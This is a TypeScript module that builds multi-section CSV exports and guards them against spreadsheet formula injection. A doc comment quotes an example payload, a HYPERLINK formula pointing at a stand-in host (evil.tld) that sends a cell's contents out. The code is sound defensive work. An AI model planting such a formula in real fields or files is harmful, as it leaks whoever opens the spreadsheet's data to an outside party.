/**
 * CSV serialization helpers.
 *
 * Pure string building — NO `document`/`Blob`/`URL`, NO server imports,
 * NO third-party deps. Works identically on the server and the client.
 * `sectionsToCsv` is used by the streaming export route handler
 * (`/insights/export`) to turn the `ExportSection[]` a page's gatherer
 * returns into the CSV body it streams back as a file download.
 *
 * Multi-section model: a single export bundles a page's KPI strip plus
 * every table / breakdown / time-series into one file. Each section is
 * written as a `# <name>` marker line, a header row, its data rows, then
 * a blank line before the next section. Excel / Sheets open this fine —
 * the blank line + comment marker keeps the sections visually separated
 * while staying a single artifact (no zip dep).
 */

export type ExportCell = string | number | null | undefined;

export type ExportSection = {
  /** Human-readable section name, written as a `# <name>` marker line. */
  name: string;
  /** Column headers for this section. */
  columns: string[];
  /** Data rows. Each row should line up with `columns`. */
  rows: ExportCell[][];
};

/**
 * Characters that make Excel / Google Sheets treat a cell as a FORMULA
 * rather than text. RFC 4180 quoting does NOT stop this — `"=cmd"` is
 * still evaluated on open.
 */
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * A plain signed decimal literal (`-12`, `+3.5`, `1e6`). These trip
 * `CSV_FORMULA_PREFIX` on the leading `-`/`+` but are never formulas, and
 * prefixing them would corrupt every negative money column in the export
 * (`-1500.00` → `'-1500.00`, which Sheets reads as text). Excluded on
 * purpose: a leading sign followed only by digits cannot invoke anything.
 */
const CSV_NUMERIC_LITERAL = /^[+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d+)?$/;

/**
 * Neutralize CSV / spreadsheet formula injection.
 *
 * Player-controlled free text (usernames, affiliate codes, emails, country
 * names) flows straight into operator exports. A username like
 * `=HYPERLINK("https://evil.tld/?d="&A2,"click")` becomes a live
 * exfiltration link the moment an operator opens the file. Prefixing with
 * a single quote is the standard neutralizer: the cell renders as literal
 * text and the leading quote is not shown by Excel / Sheets.
 *
 * Exported so the other CSV builders (`users-export.ts`,
 * `all-users-csv.ts`) apply the SAME rule instead of drifting.
 */
export function neutralizeCsvFormula(str: string): string {
  if (!CSV_FORMULA_PREFIX.test(str)) return str;
  if (CSV_NUMERIC_LITERAL.test(str)) return str;
  return `'${str}`;
}

/**
 * Escape a single CSV field per RFC 4180: wrap in double quotes when the
 * value contains a comma, double quote, CR or LF; double any internal
 * quotes. `null` / `undefined` render as an empty field. Numbers render
 * via String() so locale grouping never sneaks in (raw machine value —
 * the human-formatted version belongs in the UI, not the export).
 *
 * Formula neutralization runs FIRST (see {@link neutralizeCsvFormula}), so
 * the quoting below wraps the already-safe value.
 */
export function escapeCsvField(value: ExportCell): string {
  if (value === null || value === undefined) return "";
  // A `number` came from our own aggregates, never from user input, and
  // String() can't produce a formula — skip the sanitizer so negative
  // numbers stay numeric.
  const raw = typeof value === "number" ? String(value) : value;
  const str = typeof value === "number" ? raw : neutralizeCsvFormula(raw);
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

function rowToCsv(cells: ExportCell[]): string {
  return cells.map(escapeCsvField).join(",");
}

/**
 * Serialize one or more sections to a single CSV string.
 *
 * Single-section output is a plain header + rows block (no marker line)
 * so a one-table export is a clean ordinary CSV. Multi-section output
 * prefixes each block with a `# <name>` marker and separates blocks with
 * a blank line.
 *
 * Empty sections (no rows) still emit their marker + header so the
 * consumer can see a section existed but had no data for the window.
 */
export function sectionsToCsv(sections: ExportSection[]): string {
  if (sections.length === 0) return "";

  const multi = sections.length > 1;
  const blocks: string[] = [];

  for (const section of sections) {
    const lines: string[] = [];
    if (multi) {
      // Marker line — escaped as a single field so a section name with a
      // comma doesn't spill into extra columns.
      lines.push(escapeCsvField(`# ${section.name}`));
    }
    lines.push(rowToCsv(section.columns));
    for (const row of section.rows) {
      lines.push(rowToCsv(row));
    }
    blocks.push(lines.join("\r\n"));
  }

  // Blank line between blocks (CRLF + CRLF) so Excel treats them as
  // separate tables.
  return blocks.join("\r\n\r\n");
}
